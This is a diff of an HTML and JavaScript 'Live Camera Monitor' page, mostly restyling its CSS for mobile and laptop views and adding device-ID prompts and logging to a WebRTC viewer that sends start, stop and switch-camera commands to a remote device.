@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Live Camera Monitor</title>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>
@@ -18,100 +18,136 @@
 
 body{
     margin:0;
-    background:var(--bg);
+    background:var(--bg); /* Background dark rahega */
     font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
     display:flex;
     justify-content:center;
-    height:100vh;
-    overflow:hidden; /* ✅ SCROLL OFF */
+    align-items:center; /* Center align for Laptop */
+    height: 100vh;
+    height: 100dvh; /* Mobile Browser Bar Fix */
+    overflow: hidden; 
 }
 
 .app{
-    width:100%;
-    max-width:480px;
-    height:100vh;              /* ✅ FULL SCREEN FIT */
-    background:#000;
     display:flex;
     flex-direction:column;
+    background:#000;
+    
+    /* DEFAULT (Laptop View) settings */
+    width:100%;
+    max-width:420px; /* Thoda sleek phone look */
+    height:90vh; /* Laptop pe thoda gap rahega upar niche */
+    max-height: 850px;
+    border-radius: 20px; /* Laptop pe rounded corners */
+    box-shadow: 0 0 30px rgba(0,0,0,0.6); /* Shadow for depth */
+    overflow: hidden;
+    position: relative;
+    border: 1px solid rgba(255,255,255,0.1);
+}
+
+/* 🔥 MOBILE SPECIFIC STYLES 🔥 */
+/* Jab screen choti hogi (Asli phone par), ye CSS lagegi */
+@media (max-width: 500px) {
+    body {
+        background: #000; /* Phone pe full black background */
+        align-items: flex-start;
+    }
+    .app {
+        max-width: 100%; /* Full Width */
+        height: 100%; /* Full Height */
+        max-height: none;
+        border-radius: 0; /* Corners hat gaye */
+        border: none;
+        box-shadow: none;
+    }
 }
 
 /* HEADER */
 .header{
-    padding:14px 16px;
+    flex-shrink: 0; 
+    padding:16px 20px;
     display:flex;
     justify-content:space-between;
     align-items:center;
-    border-bottom:1px solid rgba(255,255,255,0.1);
-    flex-shrink:0;
+    background: var(--panel); 
+    color: white;
+    z-index: 10;
 }
 
 .status{
-    font-size:12px;
-    padding:5px 14px;
+    font-size:11px;
+    padding:4px 12px;
     border-radius:20px;
-    background:var(--red);
+    background:rgba(255, 69, 58, 0.2); /* Soft Red bg */
+    color: var(--red);
     font-weight:700;
+    letter-spacing: 0.5px;
+    border: 1px solid var(--red);
 }
 
 .status.live{
-    background:var(--green);
-    color:#000;
+    background:rgba(48, 209, 88, 0.2); /* Soft Green bg */
+    color: var(--green);
+    border: 1px solid var(--green);
 }
 
-/* VIDEO */
+/* VIDEO SECTION */
 .video-box{
-    flex:1;                    /* ✅ AUTO HEIGHT */
+    flex:1; 
     background:black;
     display:flex;
     justify-content:center;
     align-items:center;
-    overflow:hidden;
+    overflow: hidden; 
+    position: relative;
+    width: 100%;
 }
 
 video{
     width:100%;
     height:100%;
-    object-fit:contain;
+    object-fit:contain; /* Video fit rahega */
 }
 
 /* CONTROLS */
 .controls{
-    padding:14px;
+    flex-shrink: 0; 
+    padding:20px;
     background:var(--panel);
     display:flex;
-    gap:12px;
-    flex-shrink:0;             /* ✅ FIXED BOTTOM */
+    gap:15px;
+    /* Phone ke niche wale safe area ke liye padding */
+    padding-bottom: max(20px, env(safe-area-inset-bottom)); 
 }
 
 .btn{
     flex:1;
     border:none;
-    border-radius:16px;
-    padding:14px 0;
-    font-size:15px;
-    font-weight:700;
+    border-radius:14px;
+    padding:16px 0;
+    font-size:14px;
+    font-weight:600;
     color:white;
     cursor:pointer;
+    transition: transform 0.1s, opacity 0.2s;
+    text-transform: uppercase;
+    letter-spacing: 1px;
 }
 
-.start{ background:var(--green); color:#000; }
-.stop{ background:var(--red); }
+.btn:active {
+    transform: scale(0.96);
+    opacity: 0.8;
+}
+
+.start{ background:var(--green); color:#000; box-shadow: 0 4px 15px rgba(48, 209, 88, 0.3); }
+.stop{ background:var(--red); color: white; box-shadow: 0 4px 15px rgba(255, 69, 58, 0.3); }
 .switch{
-    background:var(--blue);
-    max-width:70px;
-    font-size:18px;
+    background:rgba(255,255,255,0.1);
+    color: var(--blue);
+    max-width:60px;
+    font-size:20px;
 }
 
-/* 💻 LAPTOP VIEW FIX */
-@media (min-width: 900px){
-    .app{
-        height:95vh;
-        margin-top:10px;
-        border-radius:18px;
-        overflow:hidden;
-        border:1px solid rgba(255,255,255,0.15);
-    }
-}
 </style>
 </head>
 
@@ -120,18 +156,19 @@ video{
 <div class="app">
 
     <div class="header">
-        <span>Live Camera</span>
+        <span style="font-weight: 600;">📷 Cam Monitor</span>
         <span id="status" class="status">OFFLINE</span>
     </div>
 
     <div class="video-box">
         <video id="remoteVideo" autoplay playsinline muted></video>
+        <div id="placeholder" style="position:absolute; color:#333; font-size:12px;">Waiting for connection...</div>
     </div>
 
     <div class="controls">
-        <button class="btn start" onclick="startCamera()">▶ START</button>
+        <button class="btn start" onclick="startCamera()">Start</button>
         <button class="btn switch" onclick="switchCamera()">🔄</button>
-        <button class="btn stop" onclick="stopCamera()">⏹ STOP</button>
+        <button class="btn stop" onclick="stopCamera()">Stop</button>
     </div>
 
 </div>
@@ -149,7 +186,9 @@ if(!DEVICE_ID){
 }
 
 if(!DEVICE_ID){
-    alert("Device ID missing!");
+    // Optional: Prompt user instead of alert for better UI
+    DEVICE_ID = prompt("Enter Device ID:", "");
+    if(DEVICE_ID) localStorage.setItem("savedDeviceId", DEVICE_ID);
 }
 
 /* ================= WEBRTC ================= */
@@ -166,18 +205,20 @@ const config = {
 socket = io(SERVER);
 
 socket.on("connect", ()=>{
+    console.log("Connected to Server");
     socket.emit("join-room","ADMIN");
 });
 
 /* ================= OFFER ================= */
 
 socket.on("offer", async (data)=>{
+    console.log("Offer received");
+    document.getElementById("placeholder").style.display = "none"; // Hide text
 
     pc = new RTCPeerConnection(config);
 
     pc.ontrack = (event) => {
         const video = document.getElementById("remoteVideo");
-
         if (event.streams && event.streams[0]) {
             video.srcObject = event.streams[0];
         } else {
@@ -185,8 +226,7 @@ socket.on("offer", async (data)=>{
             stream.addTrack(event.track);
             video.srcObject = stream;
         }
-
-        video.play().catch(()=>{});
+        video.play().catch(e => console.log("Auto-play blocked:", e));
         setStatus(true);
     };
 
@@ -201,20 +241,11 @@ socket.on("offer", async (data)=>{
         }
     };
 
-    await pc.setRemoteDescription(
-        new RTCSessionDescription({
-            type: "offer",
-            sdp: data.sdp
-        })
-    );
-
+    await pc.setRemoteDescription(new RTCSessionDescription({ type: "offer", sdp: data.sdp }));
     const ans = await pc.createAnswer();
     await pc.setLocalDescription(ans);
 
-    socket.emit("answer",{
-        target: DEVICE_ID,
-        sdp: ans.sdp
-    });
+    socket.emit("answer",{ target: DEVICE_ID, sdp: ans.sdp });
 });
 
 /* ================= ICE ================= */
@@ -232,6 +263,8 @@ socket.on("candidate", async d=>{
 /* ================= BUTTONS ================= */
 
 function startCamera(){
+    if(!DEVICE_ID) { alert("No Device ID!"); return; }
+    console.log("Sending Start Command to: " + DEVICE_ID);
     socket.emit("send-command",{
         targetId: DEVICE_ID,
         command: "start_video"
@@ -239,6 +272,7 @@ function startCamera(){
 }
 
 function stopCamera(){
+    if(!DEVICE_ID) return;
     socket.emit("send-command",{
         targetId: DEVICE_ID,
         command: "stop_video"
@@ -246,6 +280,7 @@ function stopCamera(){
 
     const v = document.getElementById("remoteVideo");
     v.srcObject = null;
+    document.getElementById("placeholder").style.display = "block"; // Show text back
 
     if(pc){
         pc.close();
@@ -256,6 +291,7 @@ function stopCamera(){
 }
 
 function switchCamera(){
+    if(!DEVICE_ID) return;
     socket.emit("switch-camera",{ target: DEVICE_ID });
 }
 
